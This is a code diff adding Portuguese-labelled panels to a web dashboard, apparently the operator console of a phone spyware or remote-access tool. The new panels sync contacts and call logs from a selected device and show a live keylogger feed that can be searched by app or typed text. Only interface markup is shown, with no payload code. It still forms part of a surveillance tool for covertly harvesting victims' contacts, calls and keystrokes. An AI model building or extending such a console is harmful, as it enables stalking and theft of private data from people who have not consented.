@@ -83,6 +83,18 @@
                         <i class="fa-solid fa-folder-open"></i>
                         <span>Arquivos</span>
                     </button>
+                    <button class="snav-item" data-nav="contacts" onclick="sidebarNav('contacts')">
+                        <i class="fa-solid fa-address-book"></i>
+                        <span>Contatos</span>
+                    </button>
+                    <button class="snav-item" data-nav="calllogs" onclick="sidebarNav('calllogs')">
+                        <i class="fa-solid fa-phone-volume"></i>
+                        <span>Ligações</span>
+                    </button>
+                    <button class="snav-item" data-nav="keylog" onclick="sidebarNav('keylog')">
+                        <i class="fa-solid fa-keyboard"></i>
+                        <span>Teclado</span>
+                    </button>
                 </nav>
 
                 <!-- Messaging -->
@@ -613,6 +625,63 @@
                             </button>
                         </div>
                         <div id="fb-list" class="fb-list" style="display:none"></div>
+                    </div>
+                </div>
+
+                <!-- Contacts Panel -->
+                <div class="grid-card contacts-card" data-tab="contacts">
+                    <div class="card-header">
+                        <h3><i class="fa-solid fa-address-book neon-text-blue"></i> Contatos</h3>
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <input class="contacts-search" id="contacts-search" type="text" placeholder="Buscar contato…" oninput="contactsFilter(this.value)">
+                            <button class="btn btn-sm btn-primary" onclick="fetchContacts()">
+                                <i class="fa-solid fa-rotate-right"></i> Sync
+                            </button>
+                        </div>
+                    </div>
+                    <div class="card-body contacts-body" id="contacts-body">
+                        <div class="contacts-empty" id="contacts-empty">
+                            <i class="fa-solid fa-address-book fa-2x"></i>
+                            <p>Selecione um dispositivo e clique em Sync</p>
+                        </div>
+                        <ul class="contacts-list" id="contacts-list" style="display:none"></ul>
+                    </div>
+                </div>
+
+                <!-- Call Logs Panel -->
+                <div class="grid-card calllogs-card" data-tab="calllogs">
+                    <div class="card-header">
+                        <h3><i class="fa-solid fa-phone-volume neon-text-green"></i> Registro de Ligações</h3>
+                        <button class="btn btn-sm btn-primary" onclick="fetchCallLogs()">
+                            <i class="fa-solid fa-rotate-right"></i> Sync
+                        </button>
+                    </div>
+                    <div class="card-body calllogs-body" id="calllogs-body">
+                        <div class="contacts-empty" id="calllogs-empty">
+                            <i class="fa-solid fa-phone fa-2x"></i>
+                            <p>Selecione um dispositivo e clique em Sync</p>
+                        </div>
+                        <ul class="calllogs-list" id="calllogs-list" style="display:none"></ul>
+                    </div>
+                </div>
+
+                <!-- Keylog Panel -->
+                <div class="grid-card keylog-card" data-tab="keylog">
+                    <div class="card-header">
+                        <h3><i class="fa-solid fa-keyboard neon-text-purple"></i> Teclado</h3>
+                        <div style="display:flex;align-items:center;gap:8px;">
+                            <input class="contacts-search" id="keylog-search" type="text" placeholder="Buscar app ou texto…" oninput="keylogFilter(this.value)">
+                            <button class="btn btn-sm btn-clear-log" onclick="clearKeylogPanel()">
+                                <i class="fa-solid fa-trash-can"></i>
+                            </button>
+                        </div>
+                    </div>
+                    <div class="card-body keylog-body" id="keylog-body">
+                        <div class="contacts-empty" id="keylog-empty">
+                            <i class="fa-solid fa-keyboard fa-2x"></i>
+                            <p>Aguardando digitação no dispositivo…</p>
+                        </div>
+                        <ul class="keylog-list" id="keylog-list" style="display:none"></ul>
                     </div>
                 </div>
 
